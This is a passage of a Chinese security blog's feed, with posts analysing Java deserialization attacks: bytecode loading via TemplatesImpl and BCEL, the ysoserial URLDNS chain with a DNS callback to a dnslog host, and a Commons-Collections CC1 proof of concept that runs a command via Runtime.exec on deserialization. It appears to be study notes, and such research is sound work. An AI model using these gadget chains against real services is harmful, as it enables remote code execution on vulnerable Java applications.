class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TemplatesImplTest</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;Hello lcdm123&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译为class文件然后用base64编码的方法获取文件内容，提供给类加载</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109132314399.png" alt="image-20211109132314399"></p><p>在很多的 java 反序列化链中都出现过<code>TemplatesImpl</code>类</p><h2 id="BCEL-ClassLoader-加载字节码"><a href="#BCEL-ClassLoader-加载字节码" class="headerlink" title="BCEL ClassLoader 加载字节码"></a>BCEL ClassLoader 加载字节码</h2><p>BCEL的全名Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被Apache Xalan 所使用，而 Apache Xalan 又是 java 内部对于 JAXP 的实现，所以BCEL也被包含在了 JDK 的原生库中。</p><p><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109144412406.png" alt="image-20211109144412406"></p><blockquote><p>需要在 BCEL字节码的前面加上 $$BCEL$$ 这样才会将他将它判断为BCEL字节码才会执行BCEL加载字节码</p></blockquote><p>参考文章</p><p>P神代码审计</p><p><a href="https://ego00.blog.csdn.net/article/details/119763746">https://ego00.blog.csdn.net/article/details/119763746</a></p><p><a href="https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/">https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/119082164">https://y4tacker.blog.csdn.net/article/details/119082164</a></p><p><a href="http://wjlshare.com/archives/1509">http://wjlshare.com/archives/1509</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-动态加载字节码&quot;&gt;&lt;a href=&quot;#Java-动态加载字节码&quot; class=&quot;headerlink&quot; title=&quot;Java 动态加载字节码&quot;&gt;&lt;/a&gt;Java 动态加载字节码&lt;/h1&gt;&lt;p&gt;严格的说，java 字节码其实仅仅指的是 java 虚拟机执</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java URLDNS反序列化链</title>
    <link href="http://example.com/2021/11/08/Java-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
    <id>http://example.com/2021/11/08/Java-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</id>
    <published>2021-11-08T00:49:09.000Z</published>
    <updated>2021-11-10T00:50:27.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ysoserial-URLDNS链分析"><a href="#Ysoserial-URLDNS链分析" class="headerlink" title="Ysoserial URLDNS链分析"></a>Ysoserial URLDNS链分析</h1><p>Java 反序列化三要素: readObject()反序列化利用点 + 反序列化链 + RCE触发点</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>ysoserial 中的 URLDNS 链 </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103132646400.png" alt="image-20211103132646400"></p><p>配置运行一下程序</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103190638779.png" alt="image-20211103190638779"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103190728640.png" alt="image-20211103190728640"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>这里是另外一个师傅写的测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//0x01.生成payload</span><br>        <span class="hljs-comment">//设置一个hashMap</span><br>        HashMap&lt;URL, String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;URL, String&gt;();<br>        <span class="hljs-comment">//设置我们可以接受DNS查询的地址http://</span><br>        URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://qu7ljs.dnslog.cn&quot;</span>);<br>        <span class="hljs-comment">//将URL的hashCode字段设置为允许修改</span><br>        Field f = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span><br>        <span class="hljs-comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span><br>        f.set(url, <span class="hljs-number">0xdeadbeef</span>);<br>        <span class="hljs-comment">//2. 将url放入hashMap中，右边参数随便写</span><br>        hashMap.put(url, <span class="hljs-string">&quot;rmb122&quot;</span>);<br>        <span class="hljs-comment">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span><br>        f.set(url, -<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//0x02.写入文件模拟网络传输</span><br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;out.ser&quot;</span>));<br>        oos.writeObject(hashMap);<br>        <span class="hljs-comment">//0x03.读取文件，进行反序列化触发payload</span><br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;out.ser&quot;</span>));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103223717961.png" alt="image-20211103223717961"></p><p>先对测试代码就行简单的理解，首先是定义了一个 <code>HashMap</code> 对象，键值分别为 <code>URL</code> 和 <code>String</code>，之后利用了反射原理获取到了权限去修改 <code>URL</code> 对象的私有成员变量 <code>HashCode</code> 值（<code>HashCode</code> 的默认值是 -1），分别更改了两次值，最后执行了一下序列化与反序列化操作。</p><p>Java 反序列化的漏洞点应该是重写后的 <code>readObject()</code> 方法所以看看序列化<code>HashMap</code>类的 <code>readObject()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>    <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>    s.defaultReadObject();<br>    reinitialize();<br>    <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                         loadFactor);<br>    s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>    <span class="hljs-keyword">int</span> mappings = s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>    <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                         mappings);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>        <span class="hljs-comment">// Size the table using given load factor only if within</span><br>        <span class="hljs-comment">// range of 0.25...4.0</span><br>        <span class="hljs-keyword">float</span> lf = Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>        <span class="hljs-keyword">float</span> fc = (<span class="hljs-keyword">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>        <span class="hljs-keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                   DEFAULT_INITIAL_CAPACITY :<br>                   (fc &gt;= MAXIMUM_CAPACITY) ?<br>                   MAXIMUM_CAPACITY :<br>                   tableSizeFor((<span class="hljs-keyword">int</span>)fc));<br>        <span class="hljs-keyword">float</span> ft = (<span class="hljs-keyword">float</span>)cap * lf;<br>        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                     (<span class="hljs-keyword">int</span>)ft : Integer.MAX_VALUE);<br><br>        <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>        <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>        <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> Node[cap];<br>        table = tab;<br><br>        <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                K key = (K) s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                V value = (V) s.readObject();<br>            putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103233814772.png" alt="image-20211103233814772"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103233852218.png" alt="image-20211103233852218"></p><blockquote><p>上面的 key 就是 URL类</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103234020569.png" alt="image-20211103234020569"></p><blockquote><p>上面的 handler 就是 URLStreamHandler</p></blockquote><p> <img src="https://gitee.com/lcdm123/image/raw/master/image-20211103234442107.png" alt="image-20211103234442107"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211104003706260.png" alt="image-20211104003706260"></p><p>最后执行到 <code>getHostAddress()</code> 就调用到<code>getByName()</code>来根据主机名获取IP地址，在网络上就是执行一次 DNS 查询操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211104000136774.png" alt="image-20211104000136774"></p><p>对于 ysoserial 的调用也是一样的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211104003402426.png" alt="image-20211104003402426"></p><p>ysoserial 为了防止在生成payload时执行URL请求和DNS查询，所以重写了一个 <code>SilentURLStreamHandler</code>类</p><h2 id="调试测试"><a href="#调试测试" class="headerlink" title="调试测试"></a>调试测试</h2><blockquote><p>明天来吧 有点困了，不划水了</p></blockquote><p>参考文章</p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541">https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541</a></p><p><a href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/">https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</a></p><p><a href="https://www.anquanke.com/post/id/201762">https://www.anquanke.com/post/id/201762</a></p><p><a href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/#more">https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/#more</a></p><p><a href="https://su18.org/post/ysoserial-su18-1/">https://su18.org/post/ysoserial-su18-1/</a></p><p>P神代码审计</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ysoserial-URLDNS链分析&quot;&gt;&lt;a href=&quot;#Ysoserial-URLDNS链分析&quot; class=&quot;headerlink&quot; title=&quot;Ysoserial URLDNS链分析&quot;&gt;&lt;/a&gt;Ysoserial URLDNS链分析&lt;/h1&gt;&lt;p&gt;Ja</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java CC链1</title>
    <link href="http://example.com/2021/11/07/Java-CC/"/>
    <id>http://example.com/2021/11/07/Java-CC/</id>
    <published>2021-11-07T13:34:32.000Z</published>
    <updated>2021-11-07T13:36:14.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>ubuntu + java7 + IDEA</p><h2 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h2><p>利用 maven 构造环境，以下代码是参考 P神代码审计中的样例，先测试以下效果</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行后成功打开计算器</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105164317083.png" alt="image-20211105164317083"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>一个接口，定义了一个<code>transform()</code>方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105191330954.png" alt="image-20211105191330954"></p><p><code>ConstantTransformer</code> <code>InvokerTransformer</code> <code>ChainedTransformer</code> 都实现了这个接口</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105190935528.png" alt="image-20211105190935528"></p><p>测试一下这个类的作用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105203849930.png" alt="image-20211105203849930"></p><p>传入的参数是一个 <code>Map</code>对象和两个实现了<code>Transformer</code>接口类的对象，返回值是一个<code>Map</code>类型的对象。它的作用就是来修饰 <code>Map</code>的，当被修饰的<code>Map</code>被添加新元素时将可以执行一个回调。上面的代码就是对<code>hashmap</code> 进行修饰，返回的<code>map</code>就是修饰后的<code>Map</code>，其中 <code>KeyTransformer</code> 是处理新元素的<code>key</code>的回调,<code>valueTransformer</code>是处理新元素的<code>value</code>的回调。        </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105210022366.png" alt="image-20211105210022366"></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105210904067.png" alt="image-20211105210904067"></p><p>这个类的代码很少，该类的<code>transform()</code> 方法就是返回构造时的参数。        </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105212302747.png" alt="image-20211105212302747"></p><p>它的作用就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>这个类可以用来执行任意方法，也是反序列化能执行任意代码的关键</p><p>构造函数，公有的构造啊函数需要三个参数第一是待执行的方法名，第二个参数是函数的参数列表的参数类型，第三个参数就是传递给函数的参数列表。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105214619152.png" alt="image-20211105214619152"></p><p>利用反射调用函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105214940329.png" alt="image-20211105214940329"></p><p>测试类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105220944207.png" alt="image-20211105220944207"></p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>根据名字来看就是将多个<code>Transformer</code>依次调用各自的<code>transform</code>连接起来</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105231814199.png" alt="image-20211105231814199"></p><p>构造函数，需要传入一个<code>Transformer</code>类的数组对象</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105222243124.png" alt="image-20211105222243124"></p><p>测试代码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105230953256.png" alt="image-20211105230953256"></p><h2 id="TransformedMap-POC"><a href="#TransformedMap-POC" class="headerlink" title="TransformedMap POC"></a>TransformedMap POC</h2><p>反序列化时如果需要执行命令，必须调用到<code>put()</code>函数，并且必须在<code>readObject()</code>中调用</p><p>主要利用得类是<code>AnnotationInvocationHandler</code>，它是在 <code>sun.reflect.annotation.AnnotationInvocationHandler</code>位置。按照之前的分析，如果要构造利用反序列化链就必须在有重写<code>readObject()</code>并且里面有对<code>Map</code>对象的增加操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211106002037911.png" alt="image-20211106002037911"></p><p>在重写的<code>readObject()</code>中最后一行中的<code>setValue()</code>就刚好可以触发整个链子，所以这样就构成了漏洞。</p><blockquote><p>注意里面的if判断语句</p></blockquote><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException </span>&#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        Map inermap = <span class="hljs-keyword">new</span> HashMap();<br>        inermap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        Transformer transformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map outermap = TransformedMap.decorate(inermap, <span class="hljs-keyword">null</span>,transformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object obj = construct.newInstance(Retention.class, outermap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br><br>        System.out.println(byteArrayOutputStream);<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object o = (Object) objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107022124421.png" alt="image-20211107022124421"></p><p>这个 POC 